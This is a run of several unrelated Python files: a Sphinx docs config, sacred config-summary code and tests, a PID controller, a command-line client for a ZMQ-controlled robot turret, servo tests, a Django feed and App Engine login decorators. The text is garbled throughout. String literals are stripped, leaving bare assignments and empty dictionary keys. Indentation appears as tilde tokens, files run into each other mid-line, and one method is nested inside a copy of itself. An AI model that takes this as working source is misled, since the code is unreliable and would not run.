# -- Options for HTML output --------------------------------------------------- \n 
\n 
# The theme to use for HTML and HTML Help pages.  See the documentation for \n 
# a list of builtin themes. \n 
\n 
# on_rtd is whether we are on readthedocs.org \n 
on_rtd = os . environ . get ( , None ) == \n 
\n 
if not on_rtd : \n 
~~~ try : \n 
~~~ import sphinx_rtd_theme \n 
html_theme = \n 
html_theme_path = [ sphinx_rtd_theme . get_html_theme_path ( ) ] \n 
~~ except ImportError : \n 
~~~ html_theme = \n 
# else: readthedocs.org uses their theme by default, so no need to specify it \n 
\n 
\n 
# Theme options are theme-specific and customize the look and feel of a theme \n 
# further.  For a list of options available for each theme, see the \n 
# documentation. \n 
#html_theme_options = {} \n 
\n 
# Add any paths that contain custom themes here, relative to this directory. \n 
#html_theme_path = [] \n 
\n 
# The name for this set of Sphinx documents.  If None, it defaults to \n 
# "<project> v<release> documentation". \n 
#html_title = None \n 
\n 
# A shorter title for the navigation bar.  Default is the same as html_title. \n 
#html_short_title = None \n 
\n 
# The name of an image file (relative to this directory) to place at the top \n 
# of the sidebar. \n 
#html_logo = None \n 
\n 
# The name of an image file (within the static path) to use as favicon of the \n 
# docs.  This file should be a Windows icon file (.ico) being 16x16 or 32x32 \n 
# pixels large. \n 
#html_favicon = None \n 
\n 
# Add any paths that contain custom static files (such as style sheets) here, \n 
# relative to this directory. They are copied after the builtin static files, \n 
# so a file named "default.css" will overwrite the builtin "default.css". \n 
~~ ~~ html_static_path = [ ] \n 
\n 
\n 
# using the given strftime format. \n 
\n 
\n 
# If true, SmartyPants will be used to convert quotes and dashes to \n 
# typographically correct entities. \n 
#html_use_smartypants = True \n 
\n 
# Custom sidebar templates, maps document names to template names. \n 
#html_sidebars = {} \n 
\n 
# Additional templates that should be rendered to pages, maps page names to \n 
# template names. \n 
#html_additional_pages = {} \n 
\n 
# If false, no module index is generated. \n 
#html_domain_indices = True \n 
\n 
# If false, no index is generated. \n 
#html_use_index = True \n 
\n 
# If true, the index is split into individual pages for each letter. \n 
#html_split_index = False \n 
\n 
# If true, links to the reST sources are added to the pages. \n 
#html_show_sourcelink = True \n 
\n 
# If true, "Created using Sphinx" is shown in the HTML footer. Default is True. \n 
#html_show_sphinx = True \n 
\n 
# If true, "(C) Copyright ..." is shown in the HTML footer. Default is True. \n 
#html_show_copyright = True \n 
\n 
# If true, an OpenSearch description file will be output, and all pages will \n 
# contain a <link> tag referring to it.  The value of this option must be the \n 
# base URL from which the finished HTML is served. \n 
\n 
\n 
# This is the file name suffix for HTML files (e.g. ".xhtml"). \n 
#html_file_suffix = None \n 
\n 
# Output file base name for HTML help builder. \n 
htmlhelp_basename = \n 
\n 
\n 
# -- Options for LaTeX output -------------------------------------------------- \n 
\n 
latex_elements = { \n 
\n 
\n 
\n 
\n 
\n 
\n 
# Additional stuff for the LaTeX preamble. \n 
\n 
} \n 
\n 
# Grouping the document tree into LaTeX files. List of tuples \n 
# (source start file, target name, title, author, documentclass [howto/manual]). \n 
latex_documents = [ \n 
( , , , \n 
, ) , \n 
] \n 
\n 
# The name of an image file (relative to this directory) to place at the top of \n 
# the title page. \n 
#latex_logo = None \n 
\n 
# For "manual" documents, if this is true, then toplevel headings are parts, \n 
# not chapters. \n 
#latex_use_parts = False \n 
\n 
# If true, show page references after internal links. \n 
#latex_show_pagerefs = False \n 
\n 
# If true, show URL addresses after external links. \n 
#latex_show_urls = False \n 
\n 
# Documents to append as an appendix to all manuals. \n 
#latex_appendices = [] \n 
\n 
# If false, no module index is generated. \n 
#latex_domain_indices = True \n 
\n 
\n 
# -- Options for manual page output -------------------------------------------- \n 
\n 
# One entry per manual page. List of tuples \n 
# (source start file, name, description, authors, manual section). \n 
man_pages = [ \n 
( , , , \n 
[ ] , 1 ) \n 
] \n 
\n 
# If true, show URL addresses after external links. \n 
#man_show_urls = False \n 
\n 
\n 
# -- Options for Texinfo output ------------------------------------------------ \n 
\n 
# Grouping the document tree into Texinfo files. List of tuples \n 
# (source start file, target name, title, author, \n 
#  dir menu entry, description, category) \n 
texinfo_documents = [ \n 
( , , , \n 
, , , \n 
) , \n 
] \n 
\n 
# Documents to append as an appendix to all manuals. \n 
#texinfo_appendices = [] \n 
\n 
# If false, no module index is generated. \n 
#texinfo_domain_indices = True \n 
\n 
\n 
\n 
\n 
# If true, do not generate a @detailmenu in the "Top" node\'s menu. \n 
#texinfo_no_detailmenu = False#!/usr/bin/env python \n 
# coding=utf-8 \n 
from __future__ import division , print_function , unicode_literals \n 
\n 
from sacred . utils import iter_prefixes , join_paths \n 
\n 
\n 
class ConfigSummary ( dict ) : \n 
~~~ def __init__ ( self , added = ( ) , modified = ( ) , typechanged = ( ) , \n 
ignored_fallbacks = ( ) ) : \n 
~~~ super ( ConfigSummary , self ) . __init__ ( ) \n 
self . added = set ( added ) \n 
self . modified = set ( modified ) # TODO: test for this member \n 
self . typechanged = dict ( typechanged ) \n 
self . ignored_fallbacks = set ( ignored_fallbacks ) # TODO: test \n 
self . ensure_coherence ( ) \n 
\n 
~~ def update_from ( self , config_mod , path = ) : \n 
~~~ added = config_mod . added \n 
updated = config_mod . modified \n 
typechanged = config_mod . typechanged \n 
self . added &= { join_paths ( path , a ) for a in added } \n 
self . modified |= { join_paths ( path , u ) for u in updated } \n 
self . typechanged . update ( { join_paths ( path , k ) : v \n 
for k , v in typechanged . items ( ) } ) \n 
self . ensure_coherence ( ) \n 
\n 
~~ def update_add ( self , config_mod , path = ) : \n 
~~~ added = config_mod . added \n 
updated = config_mod . modified \n 
typechanged = config_mod . typechanged \n 
self . added |= { join_paths ( path , a ) for a in added } \n 
self . modified |= { join_paths ( path , u ) for u in updated } \n 
self . typechanged . update ( { join_paths ( path , k ) : v \n 
for k , v in typechanged . items ( ) } ) \n 
self . ensure_coherence ( ) \n 
\n 
~~ def ensure_coherence ( self ) : \n 
# make sure parent paths show up as updated appropriately \n 
~~~ self . modified |= { p for a in self . added for p in iter_prefixes ( a ) } \n 
self . modified |= { p for u in self . modified for p in iter_prefixes ( u ) } \n 
self . modified |= { p for t in self . typechanged \n 
for p in iter_prefixes ( t ) } \n 
\n 
# make sure there is no overlap \n 
self . added -= set ( self . typechanged . keys ( ) ) \n 
self . modified -= set ( self . typechanged . keys ( ) ) \n 
self . modified -= self . added \n 
#!/usr/bin/env python \n 
# coding=utf-8 \n 
~~ ~~ from __future__ import division , print_function , unicode_literals \n 
\n 
import pytest \n 
import sacred . optional as opt \n 
from sacred . config import ConfigDict \n 
from sacred . config . custom_containers import DogmaticDict , DogmaticList \n 
\n 
\n 
@ pytest . fixture \n 
def conf_dict ( ) : \n 
~~~ cfg = ConfigDict ( { \n 
"a" : 1 , \n 
"b" : 2.0 , \n 
"c" : True , \n 
"d" : , \n 
"e" : [ 1 , 2 , 3 ] , \n 
"f" : { : , : } , \n 
} ) \n 
return cfg \n 
\n 
\n 
~~ def test_config_dict_returns_dict ( conf_dict ) : \n 
~~~ assert isinstance ( conf_dict ( ) , dict ) \n 
\n 
\n 
~~ def test_config_dict_result_contains_keys ( conf_dict ) : \n 
~~~ cfg = conf_dict ( ) \n 
assert set ( cfg . keys ( ) ) == { , , , , , } \n 
assert cfg [ ] == 1 \n 
assert cfg [ ] == 2.0 \n 
assert cfg [ ] \n 
assert cfg [ ] == \n 
assert cfg [ ] == [ 1 , 2 , 3 ] \n 
assert cfg [ ] == { : , : } \n 
\n 
\n 
~~ def test_fixing_values ( conf_dict ) : \n 
~~~ assert conf_dict ( { : 100 } ) [ ] == 100 \n 
\n 
\n 
~~ @ pytest . mark . parametrize ( "key" , [ "_underscore" , "white space" , 12 , "12" , "$f" ] ) \n 
def test_config_dict_raises_on_invalid_keys ( key ) : \n 
~~~ with pytest . raises ( KeyError ) : \n 
~~~ ConfigDict ( { key : True } ) \n 
\n 
\n 
~~ ~~ @ pytest . mark . parametrize ( "value" , [ lambda x : x , pytest , test_fixing_values ] ) \n 
def test_config_dict_raises_on_invalid_values ( value ) : \n 
~~~ with pytest . raises ( ValueError ) : \n 
~~~ ConfigDict ( { "invalid" : value } ) \n 
\n 
\n 
~~ ~~ def test_fixing_nested_dicts ( conf_dict ) : \n 
~~~ cfg = conf_dict ( { : { : } } ) \n 
assert cfg [ ] [ ] == \n 
assert cfg [ ] [ ] == \n 
\n 
\n 
~~ def test_adding_values ( conf_dict ) : \n 
~~~ cfg = conf_dict ( { : 23 , : { : 10 } } ) \n 
assert cfg [ ] == 23 \n 
assert cfg [ ] == { : 10 } \n 
assert cfg . added == { , , } \n 
\n 
\n 
~~ def test_typechange ( conf_dict ) : \n 
~~~ cfg = conf_dict ( { : , : , : 1 } ) \n 
assert cfg . typechanged == { : ( int , type ( ) ) , \n 
: ( float , type ( ) ) , \n 
: ( bool , int ) } \n 
\n 
\n 
~~ def test_nested_typechange ( conf_dict ) : \n 
~~~ cfg = conf_dict ( { : { : 10 } } ) \n 
assert cfg . typechanged == { : ( type ( ) , int ) } \n 
\n 
\n 
~~ def is_dogmatic ( a ) : \n 
~~~ if isinstance ( a , ( DogmaticDict , DogmaticList ) ) : \n 
~~~ return True \n 
~~ elif isinstance ( a , dict ) : \n 
~~~ return any ( is_dogmatic ( v ) for v in a . values ( ) ) \n 
~~ elif isinstance ( a , ( list , tuple ) ) : \n 
~~~ return any ( is_dogmatic ( v ) for v in a ) \n 
\n 
\n 
~~ ~~ def test_result_of_conf_dict_is_not_dogmatic ( conf_dict ) : \n 
~~~ cfg = conf_dict ( { : [ 1 , 1 , 1 ] } ) \n 
assert not is_dogmatic ( cfg ) \n 
\n 
\n 
~~ @ pytest . mark . skipif ( not opt . has_numpy , reason = "requires numpy" ) \n 
def test_conf_scope_handles_numpy_bools ( ) : \n 
~~~ cfg = ConfigDict ( { \n 
"a" : opt . np . bool_ ( 1 ) \n 
} ) \n 
assert in cfg ( ) \n 
assert cfg ( ) [ ] \n 
\n 
\n 
~~ def test_conf_scope_contains_presets ( ) : \n 
~~~ conf_dict = ConfigDict ( { \n 
"answer" : 42 \n 
} ) \n 
cfg = conf_dict ( preset = { : 21 , : True } ) \n 
assert set ( cfg . keys ( ) ) == { , , } \n 
assert cfg [ ] == 21 \n 
assert cfg [ ] == 42 \n 
assert cfg [ ] is True \n 
\n 
\n 
~~ def test_conf_scope_does_not_contain_fallback ( ) : \n 
~~~ config_dict = ConfigDict ( { \n 
"answer" : 42 \n 
} ) \n 
\n 
cfg = config_dict ( fallback = { : 21 , : 10 } ) \n 
\n 
assert set ( cfg . keys ( ) ) == { } \n 
\n 
\n 
~~ def test_fixed_subentry_of_preset ( ) : \n 
~~~ config_dict = ConfigDict ( { } ) \n 
\n 
cfg = config_dict ( preset = { : { : 1 , : 2 } } , fixed = { : { : 10 } } ) \n 
\n 
assert set ( cfg . keys ( ) ) == { } \n 
assert set ( cfg [ ] . keys ( ) ) == { , } \n 
assert cfg [ ] [ ] == 10 \n 
assert cfg [ ] [ ] == 2 \n 
~~ class PID ( object ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ """initizes value for the PID""" \n 
self . kd = 0 \n 
self . ki = 0 \n 
self . kp = 1 \n 
self . previous_error = 0 \n 
self . integral_error = 0 \n 
\n 
~~ def set_k_values ( self , kp , kd , ki ) : \n 
~~~ self . kp = kp \n 
self . ki = ki \n 
self . kd = kd \n 
\n 
~~ def clear_error ( self ) : \n 
~~~ self . previous_error = 0 \n 
self . integeral_error = 0 \n 
\n 
~~ def pid ( self , target , process_var , timestep ) : \n 
~~~ current_error = ( target - process_var ) \n 
p_error = self . kp * current_error \n 
d_error = self . kd * ( current_error - self . previous_error ) / timestep \n 
self . integral_error = ( \n 
current_error + self . previous_error ) / 2 + self . integral_error \n 
i_error = self . ki * self . integral_error \n 
total_error = p_error + d_error + i_error \n 
self . previous_error = current_error \n 
return total_error \n 
#!/usr/bin/env python \n 
~~ ~~ """Send commands to the bot through a CLI interface.""" \n 
\n 
import cmd \n 
import sys \n 
import os \n 
\n 
import bot . client . ctrl_client as ctrl_client_mod \n 
import bot . client . sub_client as sub_client_mod \n 
\n 
\n 
class CLI ( cmd . Cmd ) : \n 
\n 
~~~ """CLI for interacting with the bot.\n\n    Note that the architecture is that interfaces, like the Command\n    Line *Interface*, are used by agents like humans to interact\n    with the bot. For interfaces to communicate with the bot, they\n    own clients (like CtrlClient and SubClient), which know how to\n    speak ZMQ to the servers (like CtrlServer and PubServer) running on\n    the bot. Servers own systems (like gunner and driver) and known how\n    to fire commands off to those systems and/or share data about their\n    state.\n\n    """ \n 
\n 
prompt = "bot$ " \n 
\n 
def __init__ ( self , ctrl_addr , sub_addr ) : \n 
~~~ """Build CtrlClient and SubClient, for connections to servers.\n\n        We\'re not using a logger or config here to reduce dependencies.\n\n        CtrlClient is used for sending commands to the bot. Some commands,\n        like `ping`, are answered by CtrlClient directly. Others, like\n        `fire`, are actually exported methods that CtrlClient exposes\n        via the API. Those calls are passed to the relevant method of a\n        system owned by CtrlClient.\n\n        SubClient manages subscriptions to topics published by PubServer\n        on the bot. Topics can be subscribed to via `sub_add` and removed\n        via `sub_del`. To print the data being published, use `sub`.\n        Only topics that are actually subscribed to by one or more clients\n        will be published by PubServer, saving bot resources. Note that\n        PubServer isn\'t spawned by default when CtrlServer is created.\n        To spawn it (in its own thread), issue `ctrl spawn_pub_server`.\n\n        :param ctrl_addr: Address of control server to connect to via ZMQ.\n        :type ctrl_addr: string\n        :param sub_addr: Address of PUB/SUB server to connect to via ZMQ.\n        :type sub_addr: string\n\n        """ \n 
# Call superclass __init__ \n 
cmd . Cmd . __init__ ( self ) \n 
\n 
# Build control client \n 
try : \n 
~~~ self . ctrl_client = ctrl_client_mod . CtrlClient ( ctrl_addr ) \n 
~~ except Exception , e : \n 
~~~ print "Couldn\'t build CtrlClient addr:{} e:{}" . format ( ctrl_addr , e ) \n 
sys . exit ( - 1 ) \n 
\n 
# Build sub client \n 
~~ try : \n 
~~~ self . sub_client = sub_client_mod . SubClient ( sub_addr ) \n 
~~ except Exception , e : \n 
~~~ print "SubClient error sub_addr:{}, error:{}" . format ( sub_addr , e ) \n 
sys . exit ( - 1 ) \n 
\n 
~~ ~~ def default ( self , raw_args ) : \n 
~~~ """Parses API commands (ex `ctrl echo msg:7`) into calls to CtrlServer.\n\n        API commands are those given by the `list` command. Note that a\n        heuristic is used to convert params (like "7" in the example above)\n        into the types expected by the method that will be called and passed\n        that param by CtrlServer. It has held up well so far.\n\n        :param raw_args: Command from user to be parsed/passed to CtrlServer.\n        :type raw_args: string\n\n        """ \n 
obj_name , _ , rest = raw_args . partition ( " " ) \n 
if obj_name in self . ctrl_client . objects : \n 
~~~ method_name , _ , params = rest . partition ( " " ) \n 
if method_name in self . ctrl_client . objects [ obj_name ] : \n 
~~~ try : \n 
~~~ param_dict = { } \n 
# Split param into its key:value strs and iterate on them \n 
for param in params . split ( ) : \n 
# Split key:value param pair \n 
~~~ key , value = param . split ( ":" ) \n 
\n 
\n 
# this method as a string in raw_args, to the type \n 
# expected by the method it will be passed to. \n 
# This is a dirty heuristic (that so far works well)! \n 
\n 
# Try converting to int/float - easy to know if wrong \n 
try : \n 
~~~ if "." in value : \n 
~~~ value = float ( value ) \n 
~~ else : \n 
~~~ value = int ( value ) \n 
~~ ~~ except ValueError : \n 
\n 
# Check if bool \n 
~~~ if value == "True" : \n 
~~~ value = True \n 
~~ elif value == "False" : \n 
~~~ value = False \n 
\n 
~~ elif value . startswith ( "\'" ) and value . endswith ( "\'" ) : \n 
~~~ value = value [ 1 : - 1 ] \n 
# Either bool or string at this point \n 
~~ ~~ param_dict [ key ] = value \n 
~~ ~~ except IndexError : \n 
~~~ print "Bad parameter list" \n 
return \n 
~~ except ValueError : \n 
~~~ print "Bad parameter value" \n 
return \n 
~~ result = self . ctrl_client . call ( \n 
obj_name , method_name , param_dict ) \n 
print "-->" , result \n 
~~ else : \n 
~~~ print "Unknown API method:" , method_name \n 
~~ ~~ else : \n 
~~~ print "Unknown command:" , obj_name \n 
\n 
~~ ~~ def completenames ( self , text , * ignored ) : \n 
~~~ """Handles tab-completion of object names exported by the API.\n\n        Object names, like those returned by `list` (driver, gun...),\n        aren\'t known to Cmd.completenames. We extend it here to deal\n        with tab-completing them.\n\n        :param text: Text the user has type so far, to be tab-completed.\n        :type text: string\n        :param *ignored: Not documented in Cmd.completenames. No idea.\n        :type *ignored: Not documented in Cmd.completenames. Dict?\n\n        """ \n 
\n 
# Gets list of do_* methods that match what the user has typed so far \n 
cmd_match_names = cmd . Cmd . completenames ( self , text , * ignored ) \n 
\n 
# Need to do the same thing for exported API methods \n 
# Names of objects exported by API (like driver, gunner...) \n 
obj_names = self . ctrl_client . objects . keys ( ) \n 
# Build list of obj_names that start with text given by user \n 
api_match_names = [ x for x in obj_names if x . startswith ( text ) ] \n 
return cmd_match_names + api_match_names \n 
\n 
~~ def completedefault ( self , text , line , begidx , endidx ) : \n 
~~~ """Handles tab-completion of method names exported by API.\n\n        The matching of the first term (the object name exported by the API)\n        is done separately, using the results of copmletenames().\n\n        :param text: Part of method name (second arg) typed so far by user.\n        :type text: string\n        :param line: Entire line typed so far by user.\n        :type line: string\n        :param begidx: Index into "line" where "text" begins.\n        :type begidx: int\n        :param endidx: Index into "line" where "text" ends.\n        :type endidx: int\n        :returns: List of exported API methods that match text given by user.\n\n        """ \n 
obj , _ , rest = line . partition ( " " ) \n 
if obj in self . ctrl_client . objects : \n 
# If the user tries to tab-complete once they have typed \n 
# `obj method par..`, "par.." being the start of a param, this \n 
# line will grab the method name only, dropping the param. We \n 
\n 
~~~ method , _ , params = rest . strip ( ) . partition ( " " ) \n 
# Only does this if user is tab-completing method, not params \n 
if method == text : # FIXME: Should actually verify index position \n 
~~~ method_names = self . ctrl_client . objects [ obj ] \n 
match_names = [ x for x in method_names if x . startswith ( text ) ] \n 
return match_names \n 
\n 
~~ ~~ ~~ def do_list ( self , raw_args ) : \n 
~~~ """Provide a list of bot API objects and their methods.\n\n        :param raw_args: Mandatory param for Cmd handler, not used.\n        :type raw_args: string\n\n        """ \n 
print \n 
print "Available bot objects and methods" \n 
print \n 
for obj_name , methods in sorted ( self . ctrl_client . objects . items ( ) ) : \n 
~~~ print "{}:" . format ( obj_name ) \n 
for method in methods : \n 
~~~ print "    - {}" . format ( method ) \n 
~~ ~~ print \n 
\n 
~~ def help_list ( self ) : \n 
~~~ """Provide help message for list command.""" \n 
print "list" \n 
print "\\tList on-bot objects and methods exposed by the API." \n 
\n 
~~ def do_ping ( self , raw_args ) : \n 
~~~ """Ping the control server on the bot.\n\n        :param raw_args: Mandatory param for Cmd handler, not used.\n        :type raw_args: string\n\n        """ \n 
reply_time = self . ctrl_client . ping ( ) \n 
print "CtrlServer response time: {}ms" . format ( reply_time ) \n 
\n 
~~ def help_ping ( self ) : \n 
~~~ """Provide help message for ping command.""" \n 
print "ping" \n 
print "\\tPing the control server on the bot." \n 
\n 
~~ def do_sub_add ( self , raw_args ) : \n 
~~~ """Subscribe to a published topic.\n\n        Note that with ZMQ (libzmq) versions >= 3.0, topics that are not\n        subscribed to by any client are not published (done automatically\n        at the server).\n\n        :param raw_args: Commands string with topic name to add.\n        :type raw_args: string\n\n        """ \n 
# Get and validate arguments \n 
try : \n 
~~~ topic = raw_args . split ( ) [ 0 ] \n 
~~ except ( ValueError , IndexError ) : \n 
~~~ print "Invalid command, see help [cmd]." \n 
return \n 
~~ self . sub_client . add_topic ( topic ) \n 
\n 
~~ def help_sub_add ( self ) : \n 
~~~ """Provide help message for sub_add command.""" \n 
print "sub_add <topic>" \n 
print "\\tSubscribe to a published topic." \n 
\n 
~~ def do_sub_del ( self , raw_args ) : \n 
~~~ """Unsubscribe from a published topic.\n\n        Note that with ZMQ (libzmq) versions >= 3.0, topics that are not\n        subscribed to by any client are not published (done automatically\n        at the server).\n\n        :param raw_args: Commands string with topic name to unsubscribe from.\n        :type raw_args: string\n\n        """ \n 
# Get and validate arguments \n 
try : \n 
~~~ topic = raw_args . split ( ) [ 0 ] \n 
~~ except ( ValueError , IndexError ) : \n 
~~~ print "Invalid command, see help [cmd]." \n 
return \n 
~~ self . sub_client . del_topic ( topic ) \n 
\n 
~~ def help_sub_del ( self ) : \n 
~~~ """Provide help message for sub_del command.""" \n 
print "sub_del <topic>" \n 
print "\\tUnsubscribe from a published topic." \n 
\n 
~~ def do_sub ( self , raw_args ) : \n 
~~~ """Print topics subscribed to via SubClient.\n\n        :param raw_args: Mandatory param for Cmd handler, not used.\n        :type raw_args: string\n\n        """ \n 
self . sub_client . print_msgs ( ) \n 
\n 
~~ def help_sub ( self ) : \n 
~~~ """Provide help message for sub command.""" \n 
print "sub" \n 
print "\\tPrint messages subscribed to. Ctrl+c to exit." \n 
\n 
~~ def do_stop ( self , raw_args ) : \n 
~~~ """Stop all drive and gun motors, put turret in save state.\n\n        :param raw_args: Mandatory param for Cmd handler, not used.\n        :type raw_args: string\n\n        """ \n 
self . ctrl_client . stop_full ( ) \n 
\n 
~~ def help_stop ( self ) : \n 
~~~ """Provide help message for stop command.""" \n 
print "stop" \n 
print "\\tStop all drive and gun motors, put turret in safe state." \n 
\n 
~~ def do_kill ( self , raw_args ) : \n 
~~~ """Send message to CtrlServer, asking it to exit.\n\n        :param raw_args: Mandatory param for Cmd handler, not used.\n        :type raw_args: string\n\n        """ \n 
self . ctrl_client . exit_server ( ) \n 
\n 
~~ def help_kill ( self ) : \n 
~~~ """Provide help message for kill command.""" \n 
print "kill" \n 
print "\\tAsk the CtrlServer to exit." \n 
\n 
~~ def do_die ( self , raw_args ) : \n 
~~~ """Disconnect from servers and close CLI.\n\n        :param raw_args: Mandatory param for Cmd handler, not used.\n        :type raw_args: string\n\n        """ \n 
print "Disconnecting..." \n 
self . ctrl_client . clean_up ( ) \n 
self . sub_client . clean_up ( ) \n 
print "Bye!" \n 
return True \n 
\n 
~~ def help_die ( self ) : \n 
~~~ """Provide help message for die command.""" \n 
print "die" \n 
print "\\tDisconnect from servers and close CLI." \n 
\n 
~~ def do_shell ( self , cmd ) : \n 
~~~ """Allows normal shell commands to be run.\n\n        :param cmd: Everything after "shell" or "!", to be passed to shell.\n        :type cmd: string\n\n        """ \n 
os . system ( cmd ) \n 
\n 
~~ def help_shell ( self ) : \n 
~~~ """Provide help message for shell command.""" \n 
print "!|shell [command]" \n 
print "\\tSend command to underlying system shell (like Bash)." \n 
\n 
~~ def do_EOF ( self , raw_args ) : \n 
~~~ """Cleans up when ctrl+d is used to exit client.\n\n        :param raw_args: Mandatory param for Cmd handler, not used.\n        :type raw_args: string\n\n        """ \n 
print "Disconnecting..." \n 
self . ctrl_client . clean_up ( ) \n 
self . sub_client . clean_up ( ) \n 
print "Bye!" \n 
return True \n 
\n 
~~ def help_EOF ( self ) : \n 
~~~ """Provide help message for EOF (ctrl+d) command.""" \n 
print "ctrl+d" \n 
print "\\tDisconnect from servers and close CLI with ctrl+d." \n 
\n 
~~ def help_help ( self ) : \n 
~~~ """Provide help message for help command.""" \n 
print "help [command]" \n 
print "\\tProvide help on given command. If no argument, list commands." \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ if len ( sys . argv ) == 1 : \n 
~~~ print "No ctrl_addr or sub_addr given, using tcp://localhost:60000,1" \n 
CLI ( "tcp://localhost:60000" , "tcp://localhost:60001" ) . cmdloop ( ) \n 
~~ elif len ( sys . argv ) == 3 : \n 
# Using given ctr_addr and sub_addr \n 
~~~ ctrl_addr = sys . argv [ 1 ] \n 
sub_addr = sys . argv [ 2 ] \n 
CLI ( ctrl_addr , sub_addr ) . cmdloop ( ) \n 
~~ else : \n 
~~~ print "Error: Expected `./cli.py [ctrl_addr sub_addr]`" \n 
~~ ~~ """Test cases for servo abstraction class.""" \n 
\n 
from random import randint \n 
from os import path \n 
\n 
import bot . lib . lib as lib \n 
import bot . hardware . servo as s_mod \n 
import tests . test_bot as test_bot \n 
\n 
\n 
class TestPosition ( test_bot . TestBot ) : \n 
\n 
~~~ """Test setting and checking the position of a servo.""" \n 
\n 
def setUp ( self ) : \n 
~~~ """Setup test hardware files and build servo object.""" \n 
super ( TestPosition , self ) . setUp ( ) \n 
config = path . dirname ( path . realpath ( __file__ ) ) + "/test_config.yaml" \n 
self . config = lib . get_config ( config ) \n 
\n 
# Build servo in testing mode \n 
self . pwm_num = self . config [ ] \n 
self . setup_pwm ( self . pwm_num , "1\\n" , "150\\n" , "200\\n" , "0\\n" ) \n 
self . servo = s_mod . Servo ( self . pwm_num ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ """Restore testing flag state in config file.""" \n 
# Run general bot test tear down \n 
super ( TestPosition , self ) . tearDown ( ) \n 
\n 
~~ def test_0 ( self ) : \n 
~~~ """Test setting servo position to max in zero direction.""" \n 
self . servo . position = 0 \n 
assert self . servo . position == 0 , self . servo . position \n 
\n 
~~ def test_180 ( self ) : \n 
~~~ """Test setting servo position to max in 180 direction.""" \n 
self . servo . position = 180 \n 
assert self . servo . position == 180 , self . servo . position \n 
\n 
~~ def test_middle ( self ) : \n 
~~~ """Test the servo at middle position.""" \n 
self . servo . position = 90 \n 
assert self . servo . position == 90 , self . servo . position \n 
\n 
~~ def test_series ( self ) : \n 
~~~ """Test a series of positions.""" \n 
for position in range ( 0 , 180 , 18 ) : \n 
~~~ self . servo . position = position \n 
assert self . servo . position == position , self . servo . position \n 
\n 
~~ ~~ def test_manually_confirm ( self ) : \n 
~~~ """Test a series of random positions, read simulated HW to confirm.""" \n 
for i in range ( 10 ) : \n 
# Generate random position and set servo to that position \n 
~~~ test_pos = randint ( 0 , 180 ) \n 
self . servo . position = test_pos \n 
\n 
# Confirm that motor was set correctly \n 
cur_pwm = self . get_pwm ( self . pwm_num ) \n 
duty = int ( cur_pwm [ "duty_ns" ] ) \n 
read_pos = int ( round ( ( ( duty - 580000 ) / 2320000. ) * 180 ) ) \n 
assert read_pos == test_pos , "{} != {}" . format ( read_pos , test_pos ) \n 
\n 
~~ ~~ def test_over_max ( self ) : \n 
~~~ """Test position over max position. Should use maximum.""" \n 
self . servo . position = 181 \n 
assert self . servo . position == 180 , "Actual: {}" . format ( self . servo . position ) \n 
\n 
~~ def test_under_min ( self ) : \n 
~~~ """Test position under minimum position. Should use minimum.""" \n 
self . servo . position = - 1 \n 
assert self . servo . position == 0 , "Actual: {}" . format ( self . servo . position ) \n 
#:coding=utf-8: \n 
\n 
# This file written by Ian Lewis (IanLewis@member.fsf.org) \n 
# Copyright 2009 by Ian Lewis \n 
\n 
~~ ~~ from django . contrib . syndication . views import Feed as SyndicationFeed \n 
from django . core . urlresolvers import reverse \n 
from django . conf import settings \n 
\n 
from lifestream . models import Lifestream , Item \n 
\n 
class RecentItemsFeed ( SyndicationFeed ) : \n 
~~~ title = "Recent Items" \n 
description = "Recent Lifestream Items" \n 
\n 
def link ( self , obj ) : \n 
~~~ return reverse ( , kwargs = { \n 
: obj . slug , \n 
} ) \n 
\n 
~~ def get_object ( self , bits ) : \n 
~~~ return Lifestream . objects . get ( slug = bits [ 0 ] ) \n 
\n 
~~ def items ( self , obj ) : \n 
~~~ return Item . objects . published ( ) . filter ( feed__lifestream = obj ) [ : 10 ] \n 
\n 
~~ def item_pubdate ( self , item ) : \n 
~~~ return item . date \n 
\n 
~~ def item_categories ( self , item ) : \n 
~~~ def item_categories ( self , item ) : \n 
~~~ if in settings . INSTALLED_APPS : \n 
~~~ return [ tag . name for tag in item . tag_set ] \n 
~~ else : \n 
~~~ return [ ] \n 
# -*- coding: utf-8 -*- \n 
\n 
~~ ~~ ~~ ~~ """\nA decorators related authentication.\n\n:Copyright: (c) 2009 Accense Technology, Inc.,\n                     Ian Lewis <IanMLewis@gmail.com>\n                     All rights reserved.\n:license: BSD, see LICENSE for more details.\n""" \n 
\n 
from functools import update_wrapper \n 
\n 
from google . appengine . api import users \n 
from werkzeug import redirect \n 
from werkzeug . exceptions import Forbidden \n 
\n 
from kay . utils import ( \n 
create_login_url , create_logout_url \n 
) \n 
from kay . utils . decorators import auto_adapt_to_methods \n 
\n 
def login_required ( func ) : \n 
~~~ def inner ( request , * args , ** kwargs ) : \n 
~~~ if request . user . is_anonymous ( ) : \n 
~~~ if request . is_xhr : \n 
~~~ return Forbidden ( ) \n 
~~ else : \n 
~~~ return redirect ( create_login_url ( request . url ) ) \n 
~~ ~~ return func ( request , * args , ** kwargs ) \n 
~~ update_wrapper ( inner , func ) \n 
return inner \n 
\n 
~~ login_required = auto_adapt_to_methods ( login_required ) \n 
\n 
def admin_required ( func ) : \n 
~~~ def inner ( request , * args , ** kwargs ) : \n 
~~~ if not request . user . is_admin : \n 
~~~ if request . user . is_anonymous ( ) : \n 
~~~ return redirect ( create_login_url ( request . url ) ) \n 
~~ else : \n 
# TODO: Lead to more user friendly error page. \n 
~~~ raise Forbidden ( \n 
description = \n 
\n 
\n 
\' Maybe you want <a href="%s">logout</a>?\' % \n 
create_logout_url ( request . url ) \n 
) \n 
~~ ~~ return func ( request , * args , ** kwargs ) \n 
~~ update_wrapper ( inner , func ) \n 
return inner \n 
\n 
~~ admin_required = auto_adapt_to_methods ( admin_required ) \n 
\n 
# -*- coding:utf-8 -*- \n 
\n 
